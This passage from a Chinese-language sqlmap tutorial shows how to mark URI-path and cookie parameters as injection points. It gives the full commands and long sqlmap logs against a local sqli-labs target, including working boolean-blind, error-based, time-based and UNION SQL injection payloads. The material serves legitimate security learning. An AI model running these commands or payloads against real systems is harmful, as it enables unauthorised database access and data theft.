[20:14:32] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 51 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7433=7433 AND 'hrGB'='hrGB

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1' AND (SELECT 8471 FROM(SELECT COUNT(*),CONCAT(0x71767a7171,(SELECT (ELT(8471=8471,1))),0x716a766271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'Ygzr'='Ygzr

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 6957 FROM (SELECT(SLEEP(5)))YTQj) AND 'ogBe'='ogBe

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-5025' UNION ALL SELECT NULL,NULL,CONCAT(0x71767a7171,0x586f6f6965736173736f49534a4243526a6c4c625a59534d484c6d74426d6d414b7551676b734c56,0x716a766271)-- -
---
[20:14:36] [INFO] the back-end DBMS is MySQL
[20:14:36] [INFO] fetching banner
[20:14:36] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
banner: '5.7.26'
[20:14:36] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 20:14:36 /2020-02-29/

                                                                                                        
123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778
```

### 2.sqlmap设置URI注入位置

当注入点位于URI本身内部时，会出现一些特殊情况，除非手动指向URI路径，否则sqlmap不会对URI路径执行任何自动测试，必须在命令行中添加 **星号(\*)** 来指定这些注入点。
进行测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1*&us=1&uname=admin --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:31:12 /2020-02-29/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q]

[20:31:14] [INFO] testing connection to the target URL
[20:31:14] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:31:14] [INFO] testing if the target URL content is stable
[20:31:15] [INFO] target URL content is stable
[20:31:15] [INFO] testing if URI parameter '#1*' is dynamic
[20:31:15] [INFO] URI parameter '#1*' appears to be dynamic
[20:31:15] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[20:31:15] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
[20:31:15] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[20:31:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:31:17] [WARNING] reflective value(s) found and filtering out
[20:31:17] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[20:31:17] [INFO] testing 'Generic inline queries'
[20:31:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:31:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:31:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:31:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:31:17] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:31:17] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:31:17] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:31:17] [INFO] URI parameter '#1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[20:31:17] [INFO] testing 'MySQL inline queries'
[20:31:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:31:17] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)
[20:31:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:31:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:31:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:31:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[20:31:17] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[20:31:17] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:31:27] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[20:31:27] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:31:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:31:27] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:31:27] [INFO] target URL appears to have 3 columns in query
[20:31:28] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://127.0.0.1:80/sqli-labs/Less-1/?id=1' AND 9722=9722 AND 'aMLa'='aMLa

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://127.0.0.1:80/sqli-labs/Less-1/?id=1' AND (SELECT 4986 FROM(SELECT COUNT(*),CONCAT(0x716b787171,(SELECT (ELT(4986=4986,1))),0x7171767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'ocPA'='ocPA

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://127.0.0.1:80/sqli-labs/Less-1/?id=1' AND (SELECT 7645 FROM (SELECT(SLEEP(5)))FboN) AND 'hyuA'='hyuA

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: http://127.0.0.1:80/sqli-labs/Less-1/?id=-5390' UNION ALL SELECT NULL,CONCAT(0x716b787171,0x43554e745571626a51707163415541545a6246417749666442464676727449686b734f566966626b,0x7171767a71),NULL-- -
---
[20:31:33] [INFO] the back-end DBMS is MySQL
[20:31:34] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
[20:31:34] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 20:31:34 /2020-02-29/

'us' 不是内部或外部命令，也不是可运行的程序
或批处理文件。
uname: unknown option -- banner
Try 'uname --help' for more information.
                                                                                          
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485
```

增加参数标注再次测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-1/?id=1*&us=1*&uname=admin --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:33:23 /2020-02-29/

custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q]

[20:33:26] [INFO] testing connection to the target URL
[20:33:26] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:33:26] [INFO] testing if the target URL content is stable
[20:33:26] [INFO] target URL content is stable
[20:33:26] [INFO] testing if URI parameter '#1*' is dynamic
[20:33:26] [INFO] URI parameter '#1*' appears to be dynamic
[20:33:26] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[20:33:26] [INFO] heuristic (XSS) test shows that URI parameter '#1*' might be vulnerable to cross-site scripting (XSS) attacks
[20:33:26] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[20:33:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:33:28] [WARNING] reflective value(s) found and filtering out
[20:33:28] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Your")
[20:33:28] [INFO] testing 'Generic inline queries'
[20:33:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:33:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:33:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:33:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:33:28] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:33:28] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:33:28] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:33:28] [INFO] URI parameter '#1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[20:33:28] [INFO] testing 'MySQL inline queries'
[20:33:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:33:28] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)
[20:33:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:33:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:33:29] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:33:29] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[20:33:29] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[20:33:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:33:39] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[20:33:39] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:33:39] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:33:39] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:33:39] [INFO] target URL appears to have 3 columns in query
[20:33:39] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://127.0.0.1:80/sqli-labs/Less-1/?id=1' AND 6632=6632 AND 'YYeb'='YYeb

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: http://127.0.0.1:80/sqli-labs/Less-1/?id=1' AND (SELECT 4244 FROM(SELECT COUNT(*),CONCAT(0x7176786271,(SELECT (ELT(4244=4244,1))),0x7178786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'mGsy'='mGsy

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://127.0.0.1:80/sqli-labs/Less-1/?id=1' AND (SELECT 1332 FROM (SELECT(SLEEP(5)))sgvg) AND 'BhGb'='BhGb

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: http://127.0.0.1:80/sqli-labs/Less-1/?id=-9618' UNION ALL SELECT NULL,NULL,CONCAT(0x7176786271,0x586f6d53686f797063544e70586866436d4b68544670504a415a674f675176744174494f7364754e,0x7178786271)-- -
---
[20:33:55] [INFO] the back-end DBMS is MySQL
[20:33:56] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
back-end DBMS: MySQL >= 5.0
[20:33:56] [INFO] fetched data logged to text files under 'xxxx\sqlmap\output\127.0.0.1'

[*] ending @ 20:33:56 /2020-02-29/

'us' 不是内部或外部命令，也不是可运行的程序
或批处理文件。
uname: unknown option -- banner
Try 'uname --help' for more information.
                                                                               
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485
```

在默认情况下不会对URI中的参数进行测试，加了 ***** 进行标记后会进行测试。
加入cookie再次测试：

```shell
python sqlmap.py -u http://127.0.0.1/sqli-labs/Less-20/?id=1 --cookie="uname=admin*" --banner
1
```

打印

```shell
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.2.31#dev}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 20:37:34 /2020-02-29/

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q]

[20:37:36] [INFO] testing connection to the target URL
[20:37:36] [INFO] checking if the target is protected by some kind of WAF/IPS
[20:37:36] [INFO] testing if the target URL content is stable
[20:37:36] [INFO] target URL content is stable
[20:37:36] [INFO] testing if (custom) HEADER parameter 'Cookie #1*' is dynamic
do you want to URL encode cookie values (implementation specific)? [Y/n]

[20:37:37] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be dynamic
[20:37:37] [INFO] heuristic (basic) test shows that (custom) HEADER parameter 'Cookie #1*' might be injectable (possible DBMS: 'MySQL')
[20:37:37] [INFO] heuristic (XSS) test shows that (custom) HEADER parameter 'Cookie #1*' might be vulnerable to cross-site scripting (XSS) attacks
[20:37:37] [INFO] testing for SQL injection on (custom) HEADER parameter 'Cookie #1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]

[20:37:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:37:39] [WARNING] reflective value(s) found and filtering out
[20:37:39] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Login")
[20:37:39] [INFO] testing 'Generic inline queries'
[20:37:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:37:39] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:37:39] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:37:39] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:37:40] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:37:40] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:37:40] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:37:40] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable

[20:37:40] [INFO] testing 'MySQL inline queries'
[20:37:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:37:40] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)
[20:37:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:37:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:37:40] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:37:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[20:37:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[20:37:40] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:37:50] [INFO] (custom) HEADER parameter 'Cookie #1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
[20:37:50] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:37:50] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:37:50] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[20:37:50] [INFO] target URL appears to have 3 columns in query
[20:37:50] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
(custom) HEADER parameter 'Cookie #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
[20:38:00] [INFO] testing if GET parameter 'id' is dynamic
[20:38:01] [WARNING] GET parameter 'id' does not appear to be dynamic
[20:38:01] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[20:38:01] [INFO] testing for SQL injection on GET parameter 'id'
[20:38:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[20:38:01] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[20:38:01] [INFO] testing 'Generic inline queries'
[20:38:01] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:38:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[20:38:04] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[20:38:05] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[20:38:06] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[20:38:08] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[20:38:10] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[20:38:11] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[20:38:13] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[20:38:16] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[20:38:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[20:38:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[20:38:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[20:38:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[20:38:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[20:38:17] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[20:38:17] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[20:38:17] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[20:38:17] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[20:38:17] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[20:38:17] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[20:38:18] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[20:38:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[20:38:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[20:38:20] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[20:38:21] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[20:38:22] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[20:38:23] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[20:38:25] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:38:27] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:38:28] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:38:29] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[20:38:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[20:38:31] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[20:38:32] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[20:38:33] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[20:38:34] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[20:38:34] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:38:35] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[20:38:35] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[20:38:35] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[20:38:35] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[20:38:35] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[20:38:35] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[20:38:35] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[20:38:35] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[20:38:35] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[20:38:35] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[20:38:36] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[20:38:36] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[20:38:36] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[20:38:36] [INFO] testing 'MySQL inline queries'
[20:38:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[20:38:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[20:38:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[20:38:39] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[20:38:39] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[20:38:40] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[20:38:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[20:38:42] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP)'
[20:38:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP)'
[20:38:44] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP)'
[20:38:44] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SLEEP - comment)'
[20:38:45] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (SLEEP - comment)'
[20:38:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP - comment)'
[20:38:47] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind (query SLEEP - comment)'
[20:38:47] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query)'
[20:38:50] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query)'
[20:38:51] [INFO] testing 'MySQL < 5.0.12 AND time-based blind (heavy query - comment)'
[20:38:51] [INFO] testing 'MySQL < 5.0.12 OR time-based blind (heavy query - comment)'
[20:38:52] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind'
[20:38:53] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (comment)'
[20:38:54] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP)'
[20:38:55] [INFO] testing 'MySQL >= 5.0.12 RLIKE time-based blind (query SLEEP - comment)'
[20:38:56] [INFO] testing 'MySQL AND time-based blind (ELT)'
[20:38:57] [INFO] testing 'MySQL OR time-based blind (ELT)'
[20:38:58] [INFO] testing 'MySQL AND time-based blind (ELT - comment)'
[20:38:59] [INFO] testing 'MySQL OR time-based blind (ELT - comment)'
[20:38:59] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:39:01] [INFO] testing 'MySQL >= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)'
[20:39:02] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace'
[20:39:02] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[20:39:02] [INFO] testing 'MySQL < 5.0.12 time-based blind - Parameter replace (heavy queries)'
[20:39:02] [INFO] testing 'MySQL time-based blind - Parameter replace (bool)'
[20:39:02] [INFO] testing 'MySQL time-based blind - Parameter replace (ELT)'
[20:39:02] [INFO] testing 'MySQL time-based blind - Parameter replace (MAKE_SET)'
[20:39:02] [INFO] testing 'MySQL >= 5.0.12 time-based blind - ORDER BY, GROUP BY clause'
[20:39:02] [INFO] testing 'MySQL < 5.0.12 time-based blind - ORDER BY, GROUP BY clause (heavy query)'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n]

[20:39:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[20:39:16] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[20:39:23] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[20:39:32] [WARNING] GET parameter 'id' does not seem to be injectable
sqlmap identified the following injection point(s) with a total of 3431 HTTP(s) requests:
---
Parameter: Cookie #1* ((custom) HEADER)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=admin' AND 3447=3447 AND 'KGyg'='KGyg

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: uname=admin' AND (SELECT 3589 FROM(SELECT COUNT(*),CONCAT(0x717a6b6a71,(SELECT (ELT(3589=3589,1))),0x7171787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'xcai'='xcai

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 2216 FROM (SELECT(SLEEP(5)))rUMt) AND 'oohs'='oohs

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: uname=-9826' UNION ALL SELECT CONCAT(0x717a6b6a71,0x5251674f4156424d73766576455768497757664846575255634647565852644255516a63674d4256,0x7171787071),NULL,NULL-- -
---
[20:39:32] [INFO] the back-end DBMS is MySQL
[20:39:32] [INFO] fetching banner
[20:39:32] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
